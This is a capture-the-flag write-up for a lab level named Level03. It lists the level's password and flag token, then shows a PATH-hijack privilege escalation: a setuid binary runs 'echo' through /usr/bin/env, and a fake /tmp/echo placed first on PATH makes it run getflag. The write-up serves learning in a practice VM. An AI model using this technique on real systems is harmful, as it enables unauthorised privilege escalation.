# Level03 - Flag03

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level03 | `kooda2puivaav1idi4f57q8iq` |
| flag03  |                             |
| token   | `qi0maab88jeaj46qoumi7maus` |

## Steps to resolve on VM

1. Connect to `level03` user and check the repo to find an executable with 's'(setuid) permission

```bash
su level03
# Enter the token

ls -l
> total 12
> -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

# The 's' means that by executing this 'level03',
# we will get the persmissions of the individual or group that owns the file (here the 'flag03' user)
./level03
> Exploit me

# By trying to display the file content, we can see the executed command
cat level03
[...]
usr/bin/env echo Exploit me
[...]
# 'echo Exploit me' executed with the 'usr/bin/env' command
```

2. Exploit that 's' permission to force 'level03' file to execute 'getflag' command

```bash
# First create a fake 'echo' command that will execute 'getflag'
echo "getflag" > /tmp/echo
# And give it execute permission
chmod +x /tmp/echo

# 'level03' executes 'usr/bin/env' command,
# so we need to trick it and replace the 'echo' command with our fake one by adding it at the beginning of PATH
PATH=/tmp:$PATH
```

3. Now execute 'level03' which will use our fake 'echo' to get the flag

```bash
./level03
> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## Sources

### SHELL

- [What does s permission means ?](<https://askubuntu.com/questions/431372/what-does-s-permission-means#:~:text=s%20(setuid)%20means%20set%20user%20ID%20upon%20execution.&text=In%20this%20s%20permission%20was,user%2DID%20mode%20is%20set.>)
- [What is /usr/bin/env](https://stackoverflow.com/questions/43793040/how-does-usr-bin-env-work-in-a-linux-shebang-line#:~:text=env%20is%20the%20name%20of%20a%20Unix%20program.&text=Therefore%2C%20%2Fusr%2Fbin%2F,that%20contains%20the%20python3%20executable.)
- [How to add directory at beginning of PATH](http://www.troubleshooters.com/linux/prepostpath.htm)
